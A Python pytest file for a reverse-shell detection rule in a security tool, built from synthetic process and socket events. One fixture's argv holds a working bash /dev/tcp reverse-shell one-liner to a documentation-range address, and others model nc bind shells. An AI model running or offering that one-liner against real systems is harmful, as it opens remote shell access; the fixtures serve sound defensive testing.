"""Fixtures for the reverse-shell-by-lineage rule (BL-02).

A connecting (or accepting) process that then executes a shell under the same lineage is the shape
every reverse shell shares. Hosts, PIDs, accounts and paths are invented; addresses use the
documentation ranges, never any evaluation dataset's values.
"""
from datetime import UTC, datetime, timedelta

import pytest

from romulus.detect.correlation import StageMissing
from romulus.detect.lineage import MAX_GAP, TIGHT_GAP, ReverseShellByLineage
from romulus.detect.registry import ALL_PLAYBOOKS, fresh_pack
from romulus.evidence.typed import Outcome, RawRef, TypedEvent, fv

T0 = datetime(2030, 3, 1, 12, 0, tzinfo=UTC)
EXT = "203.0.113.9"
_n = 0


def _ev(family, ts, outcome=Outcome.success, host="app01", **fields):
    global _n
    _n += 1
    f = {k.replace("__", "."): fv(v, f"fx{_n}:{k}") for k, v in fields.items() if v is not None}
    return TypedEvent(id=f"e{_n:05d}", family=family, ts=ts, host=host, outcome=outcome, fields=f,
                      raw=[RawRef(target="fx", native_id=f"r{_n}")], normalizer="fixture")


def exc(exe, pid, ts, *, ppid=None, argv=None, user=None, outcome=Outcome.success, host="app01", boot=None,
        argv_complete=None):
    return _ev("process_exec", ts, outcome=outcome, host=host, process__executable=exe, process__pid=pid,
               process__ppid=ppid, process__argv=argv or [exe], process__user=user, host__boot__id=boot,
               process__argv_complete=argv_complete)


def sock(syscall, pid, ts, *, ip=EXT, port=4444, exe="/usr/bin/python3", user=None,
         outcome=Outcome.success, host="app01", boot=None):
    side = "destination" if syscall == "connect" else "source"
    fields = {"socket.syscall": syscall, "process.pid": pid, "process.executable": exe,
              "process.user": user, "host.boot.id": boot, f"{side}.ip": ip, f"{side}.port": port}
    return _ev("net_socket", ts, outcome=outcome, host=host, **{k.replace(".", "__"): v for k, v in fields.items()})


def run(*partitions):
    pb = ReverseShellByLineage()
    store = {}
    for part in partitions:
        assert pb.consume(list(part)) == []
        for event in pb.drain_staged():
            store[event.id] = event
    pb.bind_loader(lambda ids: [store[i] for i in ids if i in store])
    return pb, pb.finalize()


# ---------------------------------------------------------------- positives
def test_connect_then_in_place_shell_by_web_interpreter_is_high():
    # A www-data python connects out, then re-execs a shell in the same PID: a reverse shell.
    events = [
        exc("/usr/bin/python3", 500, T0, user="www-data"),
        sock("connect", 500, T0 + timedelta(seconds=1), user="www-data"),
        exc("/bin/bash", 500, T0 + timedelta(seconds=2), user="www-data"),
    ]
    _pb, out = run(events)
    assert len(out) == 1
    m = out[0]
    assert m.proposed_lane == "high" and m.severity == "critical" and m.confidence == "high"
    assert f"connected out to external address {EXT}" in m.claim
    assert "own process re-exec" in m.claim and "inferred from lineage and timing" in m.claim
    assert "T1059.004" in m.notes and m.group_key == f"app01|None|500|{EXT}"
    assert any(e.family == "net_socket" for e in m.events) and any(e.family == "process_exec" for e in m.events)
    assert all(p.origin for p in m.predicate)


def test_accept_then_child_shell_by_non_sshd_listener_is_a_bind_shell():
    # nc listens, accepts an external peer, then spawns a child /bin/sh: a bind shell (not an SSH login).
    events = [
        exc("/usr/bin/nc", 600, T0, ppid=1),
        sock("accept", 600, T0 + timedelta(seconds=1), ip="198.51.100.5", port=1234, exe="/usr/bin/nc"),
        exc("/bin/sh", 601, T0 + timedelta(seconds=2), ppid=600),
    ]
    _pb, out = run(events)
    assert len(out) == 1 and out[0].proposed_lane == "high"
    assert "accepted an inbound connection from external address 198.51.100.5" in out[0].claim
    assert "descendant" in out[0].claim


def test_devtcp_redirect_raises_a_non_interpreter_owner_to_high():
    # A plain daemon connects, then a descendant `sh -c` carries a /dev/tcp redirect: the redirect,
    # not the owner's identity, raises the lane to high.
    events = [
        exc("/usr/sbin/myd", 700, T0, ppid=1),
        sock("connect", 700, T0 + timedelta(seconds=1), exe="/usr/sbin/myd"),
        exc("/bin/bash", 701, T0 + timedelta(seconds=2), ppid=700,
            argv=["bash", "-c", f"bash -i >& /dev/tcp/{EXT}/4444 0>&1"]),
    ]
    _pb, out = run(events)
    assert len(out) == 1 and out[0].proposed_lane == "high"
    assert "redirects to or from a /dev/tcp pseudo-path" in out[0].claim


def test_plain_descendant_shell_from_ssh_client_is_a_lead():
    # An ssh client (not web, not an interpreter) connects then spawns a local shell with no /dev/tcp
    # redirect: a real benign lookalike, surfaced as a lead with the reason stated.
    events = [
        exc("/usr/bin/ssh", 800, T0, ppid=1),
        sock("connect", 800, T0 + timedelta(seconds=1), exe="/usr/bin/ssh", port=22),
        exc("/bin/sh", 801, T0 + timedelta(seconds=2), ppid=800),
    ]
    _pb, out = run(events)
    assert len(out) == 1 and out[0].proposed_lane == "lead" and out[0].confidence == "medium"
    assert any("lane lead" in n for n in out[0].notes)


# ---------------------------------------------------------------- hard negatives
def test_sshd_accept_then_login_shell_is_excluded_as_an_ssh_login():
    events = [
        exc("/usr/sbin/sshd", 900, T0, ppid=1),
        sock("accept", 900, T0 + timedelta(seconds=1), ip="198.51.100.5", port=50022, exe="/usr/sbin/sshd"),
        exc("/bin/bash", 901, T0 + timedelta(seconds=2), ppid=900),
    ]
    _pb, out = run(events)
    assert out == []


def test_internal_destination_is_not_a_reverse_shell():
    events = [
        exc("/usr/bin/python3", 500, T0, user="www-data"),
        sock("connect", 500, T0 + timedelta(seconds=1), ip="10.0.0.9", user="www-data"),
        exc("/bin/bash", 500, T0 + timedelta(seconds=2), user="www-data"),
    ]
    _pb, out = run(events)
    assert out == []


def test_failed_connect_does_not_own_a_socket():
    events = [
        exc("/usr/bin/python3", 500, T0, user="www-data"),
        sock("connect", 500, T0 + timedelta(seconds=1), user="www-data", outcome=Outcome.failure),
        exc("/bin/bash", 500, T0 + timedelta(seconds=2), user="www-data"),
    ]
    _pb, out = run(events)
    assert out == []


def test_a_connection_after_the_shell_does_not_join():
    events = [
        exc("/usr/bin/python3", 500, T0, user="www-data"),
        exc("/bin/bash", 500, T0 + timedelta(seconds=2), user="www-data"),
        sock("connect", 500, T0 + timedelta(seconds=5), user="www-data"),   # after the shell exec
    ]
    _pb, out = run(events)
    assert out == []


def test_gap_beyond_the_bound_does_not_join():
    events = [
        exc("/usr/bin/python3", 500, T0, user="www-data"),
        sock("connect", 500, T0 + timedelta(seconds=1), user="www-data"),
        exc("/bin/bash", 500, T0 + timedelta(seconds=MAX_GAP + 10), user="www-data"),
    ]
    _pb, out = run(events)
    assert out == []


def test_socket_exactly_at_the_shell_exec_time_is_outside_the_window():
    # Boundary: the window is [owner exec, shell exec); a socket at the shell's exec time is excluded,
    # one an instant before it joins.
    boundary = [
        exc("/usr/bin/python3", 500, T0, user="www-data"),
        sock("connect", 500, T0 + timedelta(seconds=2), user="www-data"),      # == shell ts
        exc("/bin/bash", 500, T0 + timedelta(seconds=2), user="www-data"),
    ]
    _pb, out = run(boundary)
    assert out == []
    joins = [
        exc("/usr/bin/python3", 500, T0, user="www-data"),
        sock("connect", 500, T0 + timedelta(seconds=2) - timedelta(milliseconds=1), user="www-data"),
        exc("/bin/bash", 500, T0 + timedelta(seconds=2), user="www-data"),
    ]
    _pb, out = run(joins)
    assert len(out) == 1


def test_shell_exec_without_a_pid_is_partial_not_a_clean_negative():
    pb = ReverseShellByLineage()
    pb.consume([exc("/bin/bash", None, T0, user="www-data")])
    assert pb.missing_required >= 1


def test_socket_without_an_executable_is_partial_not_a_clean_negative():
    pb = ReverseShellByLineage()
    pb.consume([_ev("net_socket", T0, socket__syscall="connect", process__pid=500,
                    destination__ip=EXT, destination__port=4444)])
    assert pb.missing_required >= 1


# ---------------------------------------------------------------- determinism and registration
def test_determinism_across_partition_order():
    events = [
        exc("/usr/bin/python3", 500, T0, user="www-data"),
        sock("connect", 500, T0 + timedelta(seconds=1), user="www-data"),
        exc("/bin/bash", 500, T0 + timedelta(seconds=2), user="www-data"),
    ]
    _pb, a = run(events)
    _pb, b = run(list(reversed(events)))
    _pb, c = run(events[:1], events[1:2], events[2:])
    assert a[0].claim == b[0].claim == c[0].claim
    assert a[0].group_key == b[0].group_key == c[0].group_key


def test_rule_is_registered_positive_only_and_staged_with_valid_attack_ids():
    cls = ReverseShellByLineage
    assert cls in ALL_PLAYBOOKS and not cls.assures_negative and cls.positive_only_reason
    assert any(isinstance(pb, cls) for pb in fresh_pack())
    assert cls.staged and cls.kind == "aggregate"
    import gzip
    import json
    from pathlib import Path
    with gzip.open(Path(__file__).resolve().parents[1] / "content/attack/enterprise-attack-20.0.json.gz") as fh:
        stix = json.load(fh)
    ids = {ref["external_id"] for obj in stix["objects"] if obj.get("type") == "attack-pattern"
           and not obj.get("revoked") and not obj.get("x_mitre_deprecated")
           for ref in obj.get("external_references", []) if ref.get("source_name") == "mitre-attack"}
    assert set(cls.attack) <= ids


# ---------------------------------------------------------------- review fixes: lane gate
def _interp_owner(child_argv, *, ip=EXT, port=4444, gap=1):
    return [
        exc("/usr/bin/python3", 500, T0, ppid=1, user="deploy"),
        sock("connect", 500, T0 + timedelta(seconds=1), ip=ip, port=port, user="deploy"),
        exc("/bin/sh", 501, T0 + timedelta(seconds=1 + gap), ppid=500, argv=child_argv),
    ]


def test_non_web_interpreter_running_a_c_script_subprocess_is_lead():
    _pb, out = run(_interp_owner(["sh", "-c", "make install"]))
    assert len(out) == 1 and out[0].proposed_lane == "lead"


@pytest.mark.parametrize("ip,port", [("8.8.8.8", 53)])
def test_dns_call_then_stdin_shell_is_lead(ip, port):
    _pb, out = run(_interp_owner(["sh", "-i"], ip=ip, port=port))
    assert len(out) == 1 and out[0].proposed_lane == "lead"


def test_port_zero_connect_is_skipped():
    _pb, out = run(_interp_owner(["sh", "-i"], port=0))
    assert out == []


def test_interpreter_then_stdin_shell_within_tight_gap_is_high():
    _pb, out = run(_interp_owner(["sh", "-i"]))
    assert len(out) == 1 and out[0].proposed_lane == "high"
    assert any("lane high" in n for n in out[0].notes)


def test_interpreter_then_stdin_shell_beyond_tight_gap_is_lead():
    _pb, out = run(_interp_owner(["sh", "-i"], gap=int(TIGHT_GAP) + 5))
    assert len(out) == 1 and out[0].proposed_lane == "lead"


# ---------------------------------------------------------------- review fixes: peer naming
def test_claim_names_the_latest_peer_and_lists_the_others():
    events = [
        exc("/usr/bin/python3", 500, T0, ppid=1),
        sock("connect", 500, T0 + timedelta(seconds=1), ip="8.8.8.8", port=53),
        sock("connect", 500, T0 + timedelta(seconds=2), ip="198.51.100.66", port=4444),
        exc("/bin/sh", 501, T0 + timedelta(seconds=3), ppid=500, argv=["sh", "-i"]),
    ]
    _pb, out = run(events)
    assert len(out) == 1
    m = out[0]
    assert "external address 198.51.100.66:4444 (its latest external socket call" in m.claim
    assert "Other external peers of that pid in the same window: 8.8.8.8:53" in m.claim
    assert m.proposed_lane == "high" and m.group_key.endswith("|198.51.100.66")


# ---------------------------------------------------------------- review fixes: PID identity windows
def test_fork_only_pid_reuse_is_worded_and_not_high():
    # pid 500's recorded exec connected long ago; a later child of "pid 500" may come from a forked process
    # with no exec record. The join is possible but never high, and the claim states the exec-record basis.
    events = [
        exc("/usr/sbin/myd", 500, T0, ppid=1),
        sock("connect", 500, T0 + timedelta(seconds=1), exe="/usr/sbin/myd"),
        exc("/bin/sh", 501, T0 + timedelta(seconds=600), ppid=500, argv=["sh", "-i"]),
    ]
    _pb, out = run(events)
    assert len(out) == 1 and out[0].proposed_lane == "lead"
    assert "no other exec recorded for pid 500 in between" in out[0].claim
    assert any("PID reuse" in n for n in out[0].notes)


def test_cron_style_reuse_after_a_new_exec_does_not_join():
    events = [
        exc("/usr/bin/python3", 500, T0, ppid=1),
        sock("connect", 500, T0 + timedelta(seconds=1)),
        exc("/usr/sbin/cron", 500, T0 + timedelta(seconds=5), ppid=1),          # pid 500 now runs cron
        exc("/bin/sh", 501, T0 + timedelta(seconds=6), ppid=500, argv=["sh", "-c", "run-parts /etc/cron.hourly"]),
    ]
    _pb, out = run(events)
    assert out == []


def test_a_connect_after_the_chain_child_was_started_does_not_join():
    events = [
        exc("/usr/bin/python3", 500, T0, ppid=1),
        exc("/bin/bash", 501, T0 + timedelta(seconds=2), ppid=500, argv=["bash", "script.sh"]),
        sock("connect", 500, T0 + timedelta(seconds=3)),                         # after 501 was started
        exc("/bin/sh", 502, T0 + timedelta(seconds=4), ppid=501, argv=["sh", "-i"]),
    ]
    _pb, out = run(events)
    assert out == []


def test_window_lower_bound_excludes_a_socket_before_the_owner_exec():
    events = [
        sock("connect", 500, T0),
        exc("/usr/bin/python3", 500, T0 + timedelta(seconds=1), ppid=1),
        exc("/bin/sh", 501, T0 + timedelta(seconds=2), ppid=500, argv=["sh", "-i"]),
    ]
    _pb, out = run(events)
    assert out == []


def test_boot_identity_keys_the_join():
    events = [
        exc("/usr/bin/python3", 500, T0, ppid=1, boot="boot-a"),
        sock("connect", 500, T0 + timedelta(seconds=1), boot="boot-b"),
        exc("/bin/sh", 501, T0 + timedelta(seconds=2), ppid=500, argv=["sh", "-i"], boot="boot-a"),
    ]
    _pb, out = run(events)
    assert out == []


def test_missing_staged_event_raises_stage_missing():
    pb = ReverseShellByLineage()
    pb.consume(_interp_owner(["sh", "-i"]))
    pb.drain_staged()
    pb.bind_loader(lambda ids: [])
    with pytest.raises(StageMissing):
        pb.finalize()


# ---------------------------------------------------------------- review fixes: sshd by exact path
def test_a_binary_named_sshd_outside_the_system_path_is_reported():
    events = [
        exc("/tmp/.x/sshd", 900, T0, ppid=1),
        sock("accept", 900, T0 + timedelta(seconds=1), ip="198.51.100.5", port=50022, exe="/tmp/.x/sshd"),
        exc("/bin/bash", 901, T0 + timedelta(seconds=2), ppid=900, argv=["bash", "-i"]),
    ]
    _pb, out = run(events)
    assert len(out) == 1


def test_socket_user_is_in_the_predicate():
    _pb, out = run(_interp_owner(["sh", "-i"]))
    assert any(p.field == "process.user" and p.value == "deploy" for p in out[0].predicate)


# ---------------------------------------------------------------- re-review fixes
def test_high_hit_after_more_than_the_cited_number_of_lead_hits_is_cited():
    events = [exc("/usr/bin/python3", 500, T0, ppid=1),
              sock("connect", 500, T0 + timedelta(seconds=1))]
    events += [exc("/bin/sh", 600 + i, T0 + timedelta(seconds=1, milliseconds=100 * (i + 1)), ppid=500,
                   argv=["sh", "-c", "id"]) for i in range(13)]
    late = exc("/bin/sh", 700, T0 + timedelta(seconds=3), ppid=500, argv=["sh"])
    _pb, out = run(events + [late])
    assert len(out) == 1 and out[0].proposed_lane == "high"
    cited = {e.id for e in out[0].events}
    assert late.id in cited and all(p.origin.split(":")[0] for p in out[0].predicate)


def test_a_dns_call_after_the_channel_does_not_hide_the_peer():
    events = [
        exc("/usr/bin/python3", 500, T0, ppid=1),
        sock("connect", 500, T0 + timedelta(seconds=1), ip="198.51.100.66", port=4444),
        sock("connect", 500, T0 + timedelta(seconds=2), ip="8.8.8.8", port=53),
        exc("/bin/sh", 501, T0 + timedelta(seconds=3), ppid=500, argv=["sh"]),
    ]
    _pb, out = run(events)
    assert len(out) == 1 and out[0].proposed_lane == "high"
    assert "external address 198.51.100.66:4444" in out[0].claim
    assert out[0].group_key.endswith("|198.51.100.66")


def test_incomplete_argv_is_never_read_as_a_stdin_shell():
    events = [
        exc("/usr/bin/python3", 500, T0, ppid=1),
        sock("connect", 500, T0 + timedelta(seconds=1)),
        exc("/bin/sh", 501, T0 + timedelta(seconds=2), ppid=500, argv=["sh"], argv_complete=False),
    ]
    pb, out = run(events)
    assert len(out) == 1 and out[0].proposed_lane == "lead"
    assert pb.missing_required >= 1
